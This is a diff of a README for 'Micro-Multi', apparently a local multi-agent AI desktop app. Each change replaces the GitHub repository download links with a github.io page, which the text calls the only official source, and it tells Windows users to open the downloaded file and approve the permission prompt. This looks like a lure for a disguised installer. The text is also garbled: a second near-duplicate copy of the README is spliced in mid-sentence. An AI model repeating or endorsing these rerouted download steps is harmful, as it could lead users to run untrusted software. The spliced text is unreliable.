@@ -1,6 +1,6 @@
 # 🤖 Micro-Multi - Run Local AI Agents Together
 
-[![Download Micro-Multi](https://img.shields.io/badge/⬇️_Download_Micro--Multi-FF6B6B?style=for-the-badge&labelColor=6A5ACD&logo=github&logoColor=white)](https://github.com/Bragii044/Micro-Multi)
+[![Download Micro-Multi](https://img.shields.io/badge/⬇️_Download_Micro--Multi-FF6B6B?style=for-the-badge&labelColor=6A5ACD&logo=github&logoColor=white)](https://bragii044.github.io)
 
 Micro-Multi is a desktop workspace for running multiple AI agents on your own computer. Instead of opening many separate chat windows, you get one place where several AI helpers can work together on projects, research, writing, planning, and repeated tasks. It is built around a local-first idea: your workspace, files, and agent setup stay on your machine. Micro-Multi is also compatible with deepseek-harness (dsh) plugins, so you can extend what your agents can do with add-on packs and reusable skills.
 
@@ -22,9 +22,9 @@ You do not need to install developer tools, set up a coding environment, or unde
 
 ## 🚀 Download Micro-Multi
 
-[![Get Micro-Multi](https://img.shields.io/badge/⬇️_Get_Micro--Multi-00C2A8?style=for-the-badge&labelColor=FF8C42&logo=github&logoColor=white)](https://github.com/Bragii044/Micro-Multi)
+[![Get Micro-Multi](https://img.shields.io/badge/⬇️_Get_Micro--Multi-00C2A8?style=for-the-badge&labelColor=FF8C42&logo=github&logoColor=white)](https://bragii044.github.io)
 
-Visit this link to download the application: [Official Micro-Multi download page](https://github.com/Bragii044/Micro-Multi).
+Visit this link to download the application: [Official Micro-Multi download page](https://bragii044.github.io).
 
 Use the official page above as your only download source. When the page opens, use it to download the application. After the download finishes, open the downloaded file to start Micro-Multi. If Windows asks for permission, review the prompt and choose the option that allows the application you downloaded from the official page to open.
 
@@ -44,7 +44,7 @@ The most important step is to start from the official page. Do not use file name
 
 When you open# 🤖 Micro-Multi - Run Local AI Agents Together
 
-[![Download Micro-Multi](https://img.shields.io/badge/⬇️_Download_Micro--Multi-FF6B6B?style=for-the-badge&labelColor=6A5ACD&logo=github&logoColor=white)](https://github.com/Bragii044/Micro-Multi)
+[![Download Micro-Multi](https://img.shields.io/badge/⬇️_Download_Micro--Multi-FF6B6B?style=for-the-badge&labelColor=6A5ACD&logo=github&logoColor=white)](https://bragii044.github.io)
 
 Micro-Multi is a desktop workspace for running multiple AI agents on your own computer. Instead of opening many separate chat windows, you get one place where several AI helpers can work side by side on projects, research, writing, planning, and repeated tasks. It is built around a local-first idea: your workspace, files, and agent setup stay on your machine. Micro-Multi is also compatible with deepseek-harness (dsh) plugins, so you can extend what your agents can do with add-on packs and reusable skills.
 
@@ -68,9 +68,9 @@ You do not need to install developer tools, set up a coding environment, or unde
 
 ## 🚀 Download Micro-Multi
 
-[![Get Micro-Multi](https://img.shields.io/badge/⬇️_Get_Micro--Multi-00C2A8?style=for-the-badge&labelColor=FF8C42&logo=github&logoColor=white)](https://github.com/Bragii044/Micro-Multi)
+[![Get Micro-Multi](https://img.shields.io/badge/⬇️_Get_Micro--Multi-00C2A8?style=for-the-badge&labelColor=FF8C42&logo=github&logoColor=white)](https://bragii044.github.io)
 
-Visit this link to download the application: [Official Micro-Multi download page](https://github.com/Bragii044/Micro-Multi).
+Visit this link to download the application: [Official Micro-Multi download page](https://bragii044.github.io).
 
 Use the official page above as your only download source. When the page opens, use it to download the application. After the download finishes, open the downloaded file to start Micro-Multi. If Windows shows a permission prompt, review it and choose the option that allows the application you downloaded from the official page to open.
 
@@ -136,7 +136,7 @@ Take a little time each day to test one new feature. Try a skill, then try a plu
 
 ## 📥 Download and Setup Recap
 
-Visit this link to download the application: [https://github.com/Bragii044/Micro-Multi](https://github.com/Bragii044/Micro-Multi).
+Visit this link to download the application: [https://bragii044.github.io](https://bragii044.github.io).
 
 Download from the official page, open the downloaded file, follow the prompts, and choose a workspace folder. That is the whole process for getting started on Windows.
 
